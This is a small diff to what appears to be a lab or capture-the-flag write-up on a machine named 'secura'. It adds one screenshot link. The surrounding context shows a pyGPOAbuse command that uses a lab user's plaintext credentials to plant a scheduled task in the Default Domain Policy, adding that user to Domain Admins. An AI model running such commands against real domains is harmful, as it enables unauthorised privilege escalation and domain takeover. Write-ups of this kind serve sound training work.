@@ -382,6 +382,8 @@ We used `pyGPOAbuse` to plant a scheduled task inside the Default Domain Policy.
 python3 pygpoabuse.py secura.yzx/charlotte:'Game2On4.!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net group "Domain Admins" charlotte /add /domain' -dc-ip 192.168.216.97
 ```
 
+![](/assets/img/posts/secura/pygpoabuse-task.png)
+
 We then forced the policy to apply straight away on **DC01 (192.168.216.97)** (normally Group Policy refreshes on a timer, but we don't want to wait):
 
 ```powershell
